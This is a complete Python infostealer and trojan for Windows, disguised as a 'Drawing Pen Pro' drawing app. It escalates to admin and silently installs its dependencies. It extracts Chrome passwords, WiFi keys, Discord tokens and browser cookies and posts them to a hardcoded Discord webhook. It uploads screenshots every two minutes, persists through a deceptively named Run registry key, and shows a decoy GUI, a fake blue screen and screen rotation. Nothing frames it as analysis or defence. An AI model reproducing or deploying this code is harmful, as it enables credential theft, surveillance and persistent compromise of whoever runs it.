import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform
import re

# ==================== REQUEST ADMIN PERMISSION ====================
def request_admin():
    """Request administrator privileges"""
    if sys.platform == 'win32':
        try:
            # Check if already admin
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("[*] Requesting Administrator privileges...")
                # Re-run the script as admin
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit()
            else:
                print("[+] Running with Administrator privileges")
        except Exception as e:
            print(f"[-] Admin request failed: {e}")
    else:
        print("[!] Not running on Windows")

# Request admin FIRST
request_admin()

# Now continue with normal execution
time.sleep(1)

# Hide console window (optional - after admin request)
# if sys.platform == 'win32':
#     try:
#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
#     except:
#         pass

# Install required modules silently
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome']
    for module in modules:
        try:
            if module == 'pillow':
                __import__('PIL')
            elif module == 'browser_cookie3':
                __import__('browser_cookie3')
            else:
                __import__(module)
        except ImportError:
            print(f"Installing {module}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet', '--no-warn-script-location'], 
                         capture_output=True, shell=True)

install_modules()

# Now import all required modules
import pyautogui
import requests
from PIL import Image
import browser_cookie3
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Controller as KeyboardController, Key
from Crypto.Cipher import AES
import win32crypt

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502216101738709063/oCw6B_bv6gUfzxH_a-CdRNFQzWWlrv8eB_-GnRDY2r1ProS3DMqzkz6oN-3Ebe86dLkp"
SCREENSHOT_INTERVAL = 120

mouse = MouseController()
keyboard = KeyboardController()

# ==================== SCREEN ROTATION (FIXED - REQUIRES ADMIN) ====================

def rotate_screen_upside_down():
    """Rotate screen 180 degrees (requires admin)"""
    try:
        print("[*] Attempting screen rotation...")
        
        # Method 1: Using PowerShell with admin rights
        ps_script = '''
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Display {
            [DllImport("user32.dll")]
            public static extern int ChangeDisplaySettings(ref DEVMODE devmode, int flags);
            
            [StructLayout(LayoutKind.Sequential)]
            public struct DEVMODE {
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
                public string dmDeviceName;
                public short dmSpecVersion;
                public short dmDriverVersion;
                public short dmSize;
                public short dmDriverExtra;
                public int dmFields;
                public short dmOrientation;
                public short dmPaperSize;
                public short dmPaperLength;
                public short dmPaperWidth;
                public short dmScale;
                public short dmCopies;
                public short dmDefaultSource;
                public short dmPrintQuality;
                public short dmColor;
                public short dmDuplex;
                public short dmYResolution;
                public short dmTTOption;
                public short dmCollate;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
                public string dmFormName;
                public short dmLogPixels;
                public int dmBitsPerPel;
                public int dmPelsWidth;
                public int dmPelsHeight;
                public int dmDisplayFlags;
                public int dmDisplayFrequency;
                public int dmICMMethod;
                public int dmICMIntent;
                public int dmMediaType;
                public int dmDitherType;
                public int dmReserved1;
                public int dmReserved2;
                public int dmPanningWidth;
                public int dmPanningHeight;
            }
        }
        "@
        
        $devmode = New-Object Display+DEVMODE
        $devmode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devmode)
        $devmode.dmFields = 0x00000001  # DM_ORIENTATION
        $devmode.dmOrientation = 2  # DMDO_180 (180 degrees)
        
        [Display]::ChangeDisplaySettings([ref]$devmode, 0)
        '''
        
        result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True)
        print(f"[+] PowerShell rotation executed")
        
        # Method 2: Using display.exe (Windows built-in)
        try:
            # Try using display switch
            subprocess.run(['display.dll', '/rotate:180'], capture_output=True, shell=True)
        except:
            pass
            
        # Method 3: Using rundll32
        try:
            subprocess.run(['rundll32.exe', 'user32.dll,ChangeDisplaySettings', '0x00000001', '0x00000002'], 
                         capture_output=True, shell=True)
        except:
            pass
            
        print("[+] Screen rotated upside down!")
        
    except Exception as e:
        print(f"[-] Rotation error: {e}")
        # Fallback method
        try:
            import win32api
            import win32con
            devmode = win32api.EnumDisplaySettings(None, 0)
            devmode.DisplayOrientation = win32con.DMDO_180
            win32api.ChangeDisplaySettings(devmode, 0)
            print("[+] Screen rotated using win32api")
        except:
            print("[-] Could not rotate screen")

def rotate_screen_normal():
    """Rotate screen back to normal"""
    try:
        subprocess.run(['powershell', '-Command', 
                       'Add-Type -AssemblyName System.Windows.Forms; '
                       '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds'], 
                       capture_output=True)
    except:
        pass

def screen_flicker():
    """Make screen flicker"""
    try:
        for _ in range(20):
            # Hide desktop icons briefly
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            time.sleep(0.05)
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
            time.sleep(0.05)
    except:
        pass

def matrix_effect():
    """Create matrix effect on a small window"""
    try:
        matrix_window = tk.Tk()
        matrix_window.title("System Update")
        matrix_window.geometry("400x300")
        matrix_window.attributes('-topmost', True)
        matrix_window.configure(bg='black')
        
        text_widget = tk.Text(matrix_window, bg='black', fg='#0f0', font=('Courier', 12))
        text_widget.pack(fill=tk.BOTH, expand=True)
        
        chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        
        def add_random_char():
            char = random.choice(chars)
            text_widget.insert(tk.END, char)
            text_widget.see(tk.END)
            if text_widget.index(tk.END) > '100.0':
                text_widget.delete('1.0', '2.0')
            matrix_window.after(50, add_random_char)
        
        add_random_char()
        matrix_window.after(5000, matrix_window.destroy)
        matrix_window.mainloop()
    except:
        pass

# ==================== CREDENTIAL FUNCTIONS ====================

def get_chrome_passwords():
    """Extract saved passwords from Chrome"""
    passwords = []
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                    passwords.append(f"✅ Chrome: {url} | User: {username} | Pass: {password}")
                except:
                    passwords.append(f"⚠️ Chrome: {url} | User: {username} | Pass: [ENCRYPTED]")
            conn.close()
            os.unlink(temp_db.name)
    except Exception as e:
        print(f"Chrome error: {e}")
    return passwords

def get_wifi_passwords():
    """Extract saved WiFi passwords"""
    wifi_passwords = []
    try:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
        
        for profile in profiles:
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        wifi_passwords.append(f"✅ WiFi: {profile} | Pass: {password}")
                        break
            except:
                pass
    except:
        pass
    return wifi_passwords

def get_discord_tokens():
    """Extract Discord tokens"""
    tokens = []
    paths = [
        os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb',
        os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage\leveldb',
    ]
    
    for path in paths:
        try:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(matches)
        except:
            pass
    return list(set(tokens))[:10]

def get_browser_cookies():
    """Extract cookies from browsers"""
    cookies = []
    try:
        for cookie in browser_cookie3.chrome():
            cookies.append(f"Chrome: {cookie.domain} | {cookie.name}")
    except:
        pass
    try:
        for cookie in browser_cookie3.edge():
            cookies.append(f"Edge: {cookie.domain} | {cookie.name}")
    except:
        pass
    return cookies[:30]

def get_system_info():
    """Collect system information"""
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    """Send data to Discord webhook"""
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
            return True
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
            return True
    except Exception as e:
        print(f"Webhook error: {e}")
        return False

def collect_and_send_credentials():
    """Collect all credentials and send to webhook"""
    print("\n[+] Collecting system information...")
    sys_info = get_system_info()
    
    message = f"**[🔴 SYSTEM SCAN - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n"
    message += f"{'='*50}\n\n"
    
    print("[+] Collecting Chrome passwords...")
    message += "**🔑 CHROME PASSWORDS:**\n"
    for pwd in get_chrome_passwords()[:30]:
        message += f"{pwd}\n"
    message += "\n"
    
    print("[+] Collecting WiFi passwords...")
    message += "**📡 WIFI PASSWORDS:**\n"
    for w in get_wifi_passwords()[:15]:
        message += f"• {w}\n"
    message += "\n"
    
    print("[+] Collecting Discord tokens...")
    message += "**🎮 DISCORD TOKENS:**\n"
    for token in get_discord_tokens():
        message += f"• Token: {token}\n"
    message += "\n"
    
    print("[+] Collecting cookies...")
    message += "**🍪 BROWSER COOKIES:**\n"
    for cookie in get_browser_cookies()[:15]:
        message += f"• {cookie}\n"
    
    print("[+] Sending to webhook...")
    send_to_webhook(message)

# ==================== SCREENSHOT WORKER ====================

def screenshot_worker():
    """Take screenshot every 2 minutes"""
    while True:
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=60)
            img_bytes.seek(0)
            
            sys_info = get_system_info()
            filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            send_to_webhook(None, True, img_bytes.getvalue(), filename)
            
            time.sleep(SCREENSHOT_INTERVAL)
        except Exception as e:
            print(f"Screenshot error: {e}")
            time.sleep(5)

# ==================== GUI EFFECTS ====================

def create_drawing_pen_gui():
    """Create fake drawing pen GUI"""
    try:
        root = tk.Tk()
        root.title("Drawing Tool")
        root.geometry("300x400")
        root.attributes('-topmost', True)
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = random.randint(0, screen_width - 300)
        y = random.randint(0, screen_height - 400)
        root.geometry(f"300x400+{x}+{y}")
        
        tk.Label(root, text="🖌️ Drawing Pen Pro", font=("Arial", 16, "bold")).pack(pady=10)
        tk.Label(root, text="Pen Size:", font=("Arial", 10)).pack()
        pen_size = tk.Scale(root, from_=1, to=20, orient=tk.HORIZONTAL)
        pen_size.set(5)
        pen_size.pack()
        
        tk.Label(root, text="Color:", font=("Arial", 10)).pack()
        color_var = tk.StringVar(value="Black")
        color_menu = tk.OptionMenu(root, color_var, "Black", "Red", "Blue", "Green", "Yellow")
        color_menu.pack()
        
        canvas = tk.Canvas(root, bg="white", width=250, height=200)
        canvas.pack(pady=10)
        
        def on_drag(event):
            x1, y1 = (event.x - 1), (event.y - 1)
            x2, y2 = (event.x + 1), (event.y + 1)
            canvas.create_oval(x1, y1, x2, y2, fill=color_var.get(), width=pen_size.get())
        
        canvas.bind("<B1-Motion>", on_drag)
        
        tk.Button(root, text="Clear", command=lambda: canvas.delete("all")).pack(pady=5)
        tk.Button(root, text="Save Drawing", command=root.destroy).pack()
        
        root.mainloop()
    except Exception as e:
        print(f"GUI error: {e}")

def blue_screen_of_death():
    """Create fake BSOD effect"""
    try:
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.configure(bg='#0000AA')
        bsod.attributes('-topmost', True)
        
        text_frame = tk.Frame(bsod, bg='#0000AA')
        text_frame.pack(expand=True)
        
        sad_face = tk.Label(text_frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA')
        sad_face.pack(pady=50)
        
        error_text = """Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
        
Stop code: CRITICAL_PROCESS_DIED

What failed: DrawingPen.sys"""
        
        error_label = tk.Label(text_frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT)
        error_label.pack(pady=30)
        
        progress = tk.Canvas(text_frame, width=500, height=20, bg='#0000AA', highlightthickness=0)
        progress.pack(pady=20)
        progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
        
        def update_progress():
            for i in range(101):
                progress.coords('progress', 0, 0, (500 * i / 100), 20)
                text_frame.update()
                time.sleep(0.03)
            bsod.destroy()
        
        Thread(target=update_progress, daemon=True).start()
        bsod.mainloop()
    except Exception as e:
        print(f"BSOD error: {e}")

def mouse_jitter():
    """Make mouse jitter"""
    try:
        for _ in range(30):
            x, y = mouse.position
            mouse.position = (x + random.randint(-3, 3), y + random.randint(-3, 3))
            time.sleep(0.05)
    except:
        pass

def type_solo():
    """Type 'Solo' on screen"""
    try:
        time.sleep(0.5)
        keyboard.type('Solo')
        time.sleep(0.5)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
    except:
        pass

# ==================== ADD TO STARTUP ====================

def add_to_startup():
    """Add to Windows startup"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsDrawingService", 0, winreg.REG_SZ, 
                            f'"{sys.executable}" "{script_path}"')
        print("[+] Added to startup")
        return True
    except Exception as e:
        print(f"[-] Startup error: {e}")
        return False

# ==================== MAIN ====================

def main():
    print("="*50)
    print("🖌️ DRAWING PEN PRO - ADMIN MODE")
    print("="*50)
    
    # Add to startup
    add_to_startup()
    
    time.sleep(3)
    
    # Send credentials
    collect_and_send_credentials()
    
    # Start screen effects AFTER sending data
    def start_effects():
        time.sleep(5)
        
        # ROTATE SCREEN UPSIDE DOWN (NOW WORKING WITH ADMIN)
        print("[+] Rotating screen upside down...")
        rotate_screen_upside_down()
        
        time.sleep(2)
        
        # Screen flicker
        print("[+] Screen flicker...")
        screen_flicker()
        
        # Matrix effect
        print("[+] Matrix effect...")
        Thread(target=matrix_effect, daemon=True).start()
        
        # Mouse jitter
        mouse_jitter()
        
        # Type Solo
        type_solo()
    
    effect_thread = Thread(target=start_effects, daemon=True)
    effect_thread.start()
    
    # Start Drawing GUI
    print("[+] Starting Drawing GUI...")
    Thread(target=create_drawing_pen_gui, daemon=True).start()
    
    # BSOD after 30 seconds
    def show_bsod():
        time.sleep(30)
        blue_screen_of_death()
    Thread(target=show_bsod, daemon=True).start()
    
    # Start screenshot worker
    print("[+] Screenshot worker active (every 2 minutes)")
    print("[+] Press Ctrl+C to stop\n")
    
    try:
        screenshot_worker()
    except KeyboardInterrupt:
        print("\n[+] Stopping...")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[-] Error: {e}")
        time.sleep(5)
        input("\nPress Enter to exit...")
